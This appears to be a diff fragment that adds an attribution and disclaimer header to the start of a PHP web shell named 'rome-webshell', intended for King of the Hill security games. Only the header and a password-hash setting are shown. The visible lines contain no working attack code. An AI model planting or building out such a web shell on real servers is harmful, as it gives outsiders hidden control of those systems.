@@ -1,3 +1,15 @@
+<!-- 
+    @author Caesarovich
+    @repository https://github.com/Caesarovich/rome-webshell
+
+    This code is for educationnal purposes only.
+    Malicious usage of this code will not hold the author responsible.
+    Do not pentest without explicit permissions.
+
+-->
+
+
+
 <?php
     // Password protection, useful for King of The Hill games
     $pass=''; // Set to null to disable; Set to string to enable, must be the md5 hash of the password.
